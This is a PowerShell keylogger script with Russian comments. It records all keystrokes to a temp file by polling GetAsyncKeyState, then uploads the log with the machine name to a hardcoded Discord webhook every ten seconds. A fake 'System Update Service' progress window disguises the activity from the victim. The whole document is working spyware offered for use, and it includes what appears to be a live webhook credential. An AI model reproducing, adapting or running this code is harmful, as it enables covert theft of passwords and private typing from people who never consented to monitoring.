# Конфигурация
$webhookUrl = "https://discordapp.com/api/webhooks/1369790444417843280/a9TksyeMBftjI4WtLVIh1-lY8_QiQf02cAMvw5BSmmxvP-Yz6k-IWWSM4kHPTBBXtXZk"
$logFilePath = "$env:TEMP\keylog.txt"
$checkInterval = 10 # секунд

# Создаём простой GUI для отображения статуса
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
$form.Text = "System Update Service"
$form.Width = 400
$form.Height = 200
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10, 20)
$label.Width = 380
$label.Text = "Подготовка системного обновления..."
$form.Controls.Add($label)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(10, 60)
$progressBar.Width = 380
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
$form.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = New-Object System.Drawing.Point(10, 100)
$statusLabel.Width = 380
$statusLabel.Text = "Статус: Инициализация..."
$form.Controls.Add($statusLabel)

# Показываем форму асинхронно
$form.Show() | Out-Null
$form.Update()

function Update-Status {
    param($message)
    $statusLabel.Text = "Статус: $message"
    $form.Update()
}

function Show-Error {
    param($errorMessage)
    [System.Windows.Forms.MessageBox]::Show(
        $errorMessage,
        "Ошибка системы",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    )
}

# Функция для отправки логов в Discord
function Send-ToDiscord {
    param (
        [string]$filePath,
        [string]$message
    )
    
    Update-Status "Проверка логов..."
    
    if (Test-Path $filePath -PathType Leaf) {
        $fileContent = Get-Content $filePath -Raw
        
        if (-not [string]::IsNullOrEmpty($fileContent)) {
            Update-Status "Отправка данных..."
            
            $boundary = [System.Guid]::NewGuid().ToString()
            $body = @"
--$boundary
Content-Disposition: form-data; name="content"

$message
--$boundary
Content-Disposition: form-data; name="file"; filename="keylog.txt"
Content-Type: text/plain

$fileContent
--$boundary--
"@

            try {
                $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
                
                if ($response) {
                    Update-Status "Данные успешно отправлены"
                    Clear-Content $filePath
                    return $true
                }
            } catch {
                $errorMsg = "Ошибка при отправке: $($_.Exception.Message)"
                Update-Status $errorMsg
                Show-Error $errorMsg
                return $false
            }
        }
    }
    Update-Status "Нет новых данных для отправки"
    return $false
}

# Функция для перехвата нажатий клавиш (без изменений)
function Start-Keylogger {
    $signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
    
    $API = Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace API -PassThru

    if (-not (Test-Path $logFilePath)) {
        New-Item -Path $logFilePath -ItemType File -Force | Out-Null
    }

    while ($true) {
        Start-Sleep -Milliseconds 40
        
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            
            if ($state -eq -32767) {
                switch ($ascii) {
                    8 { "[BACKSPACE]" | Out-File -FilePath $logFilePath -Append }
                    9 { "[TAB]" | Out-File -FilePath $logFilePath -Append }
                    13 { "[ENTER]" | Out-File -FilePath $logFilePath -Append }
                    27 { "[ESC]" | Out-File -FilePath $logFilePath -Append }
                    32 { " " | Out-File -FilePath $logFilePath -Append }
                    default {
                        $key = [char]$ascii
                        $shiftState = $API::GetAsyncKeyState(16)
                        
                        if (($shiftState -eq -32767) -xor [Console]::CapsLock) {
                            if ($ascii -ge 97 -and $ascii -le 122) {
                                $key = [char]($ascii - 32)
                            }
                        }
                        
                        $key | Out-File -FilePath $logFilePath -Append
                    }
                }
            }
        }
    }
}

# Основной процесс
Update-Status "Проверка соединения..."
$testResult = Send-ToDiscord -filePath $logFilePath -message "Keylogger инициализирован на $env:COMPUTERNAME"

if (-not $testResult) {
    Show-Error "Не удалось проверить соединение с сервером. Скрипт будет остановлен."
    $form.Close()
    exit
}

Update-Status "Запуск фоновых процессов..."
$keyloggerJob = Start-Job -ScriptBlock ${function:Start-Keylogger}

Update-Status "Мониторинг активности..."
while ($true) {
    Start-Sleep -Seconds $checkInterval
    $sendResult = Send-ToDiscord -filePath $logFilePath -message "Логи с $env:COMPUTERNAME"
    
    if (-not $sendResult) {
        Start-Sleep -Seconds 30
    }
}
